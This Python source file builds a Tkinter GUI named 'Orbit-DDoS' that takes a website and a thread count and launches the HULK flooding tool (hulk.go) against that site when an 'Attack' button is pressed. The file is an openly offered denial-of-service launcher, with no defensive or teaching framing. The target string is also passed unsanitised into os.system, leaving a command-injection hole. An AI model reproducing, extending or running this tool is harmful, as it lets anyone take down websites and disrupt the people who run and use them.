from tkinter import *
import tkinter as tk
from tkinter import ttk 
import os
from tkinter import messagebox
import subprocess
import shlex
import platform
#DDoSing Target Function
def run_command(command):
    process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE)
    while True:
        output = process.stdout.readline()
        if output == '' and process.poll() is not None:
            break
        if output:
            print(output.strip())
    rc = process.poll()
    return rc
def Attack_Target():
    website = str(Website.get())
    threads = str(Thread.get())
    if str(platform.system()) == 'Linux':
        os.system('figlet AnonymousPAK DDoS')
    else:
        os.system("pyfiglet AnonymousPAK DDoS")
    messagebox.showinfo("Orbit Status", "DDoS Attack has been Started with " + str(threads) + " on Website " + website)
    if str(platform.system()) == 'Windows':
        os.system('go run hulk.go -site {0}'.format(website))
    else:
        DDoS_Output = "HULKMAXPROCS={0} go run hulk.go -site {1}".format(threads, website)
        os.system(DDoS_Output)



       
    
root = tk.Tk()
root.title("Orbit | VERSION: 1.6 ")
root.configure(bg='black')
root.geometry("385x275")

# Image
bg = PhotoImage(file="background.png")

# Label
my_label = Label(root, image=bg)
my_label.place(x=50, y=50, relwidth=1, relheight=1)



Information = Label(text = "Orbit-DDoS", font = 'Calbri')
Information.grid(row =1, column =1)
Usage = Label(text = 'Made by: Chai-Programming')
Usage.grid(row =2, column =1)
Website_Name = Label(text = "Website to DDoS")
Website_Name.grid(row = 3, column =1)
Website = tk.Entry(root,bd = 5)
Website.grid(row =4, column =1)
Thread_Name = Label(text = "Number of Threads (1024 to Infinity) [requires a powerfull pc to do a lot]")
Thread_Name.grid(row = 5, column =1)
Thread = tk.Entry(root,bd = 5)
Thread.grid(row = 6, column =1)


Attack_Button = Button(text = '¿Attack?', font = 'Impact', bd = 5, command = Attack_Target)
Attack_Button.configure(bg='red')

Attack_Button.grid(row = 7, column =1)

root.mainloop()
